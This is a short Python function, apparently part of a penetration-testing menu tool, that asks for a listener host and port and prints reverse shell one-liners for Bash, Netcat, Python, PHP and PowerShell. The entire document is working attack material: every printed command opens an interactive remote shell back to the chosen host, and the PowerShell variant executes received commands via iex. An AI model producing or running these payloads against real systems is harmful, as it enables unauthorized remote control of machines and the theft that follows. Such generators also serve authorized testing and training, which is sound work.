def reverse_shells():
    lhost = input("LHOST: ")
    lport = input("LPORT: ")

    print("\n=== Reverse Shell Generator ===")

    print("\n[Bash]")
    print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")

    print("\n[Netcat]")
    print(f"nc -e /bin/bash {lhost} {lport}")

    print("\n[Python]")
    print(
        "python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"
    )

    print("\n[PHP]")
    print(
        f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )

    print("\n[PowerShell]")
    print(
        f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""
    )

    input("\nPress Enter to return...")
